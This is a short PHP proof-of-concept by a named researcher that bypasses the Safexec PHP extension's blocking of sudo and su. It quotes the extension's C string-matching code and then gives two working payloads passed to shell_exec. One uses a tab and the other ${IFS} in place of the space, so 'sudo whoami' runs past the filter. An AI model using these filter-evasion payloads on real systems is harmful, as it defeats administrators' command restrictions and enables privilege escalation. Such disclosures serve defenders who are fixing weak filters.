<?php
/* Safexec PHP extension bypass
 * By @Wireghoul - justanotherhacker.com
 *
 * Safexec - https://github.com/ilk33r/safexec
 * ----------------
 * String matches for presence of sudo or su to prevent their use.
 * https://github.com/ilk33r/safexec/blob/master/safeexec.c#L120
 *
```
    if(SAFEEXEC_G(dissallow_sudo_command))
    {
        char *searchSudoWord;
        searchSudoWord = strstr(cmd, "sudo ");

         if (searchSudoWord != NULL)
         {
            php_error_docref(NULL TSRMLS_CC, E_WARNING, "Cannot execute %s command. Sudo command is not allowed with safeexec extension", cmd);
            return '0';
         }

         searchSudoWord = strstr(cmd, "su ");

         if (searchSudoWord != NULL)
         {
            php_error_docref(NULL TSRMLS_CC, E_WARNING, "Cannot execute %s command. Su command is not allowed with safeexec extension", cmd);
            return '0';
         }
    }
```
*/

//Bypass1
$cmd="sudo\twhoami";
shell_exec($cmd);

//Bypass2
$cmd="sudo\${IFS}whoami";
shell_exec($cmd);

?>
